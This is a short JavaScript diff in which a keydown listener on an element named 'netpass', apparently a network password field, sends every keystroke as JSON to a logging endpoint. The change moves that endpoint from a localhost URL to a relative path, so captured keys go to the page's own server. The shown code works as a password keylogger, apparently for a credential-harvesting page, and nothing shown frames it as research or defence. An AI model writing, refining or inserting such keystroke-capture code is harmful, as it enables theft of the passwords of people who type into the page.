@@ -22,7 +22,7 @@ netpass.addEventListener("keydown", function(event){
     output = event.key
 
     const outcome = {message: output} 
-    fetch("http://127.0.0.1:8080/log", {
+    fetch("log", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
